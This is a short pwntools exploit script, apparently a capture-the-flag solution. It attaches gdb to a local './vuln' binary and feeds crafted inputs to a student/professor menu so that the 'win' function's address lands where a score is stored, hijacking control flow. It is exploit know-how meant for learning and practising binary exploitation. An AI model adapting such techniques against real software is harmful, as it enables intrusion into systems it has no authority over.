#!/usr/bin/env python2

from pwn import *

elf = ELF('./vuln')
p = process('./vuln')

win = elf.symbols['win']

context.terminal = ['tmux', 'new-window']
gdb.attach(p)

def run(student, professor, student2, professor2, score):
    p.recv()
    p.send(student)
    p.recv()
    p.send(professor)
    p.recv()
    p.send(student2)
    p.recv()
    p.send(professor2)
    p.recv()
    p.sendline(str(score))

run('A'*8, 'B'*8, 'A'*8, 'A'*8, win)
run('C'*8, 'D'*8, 'A'*8, 'D'*8, 100)

p.interactive()
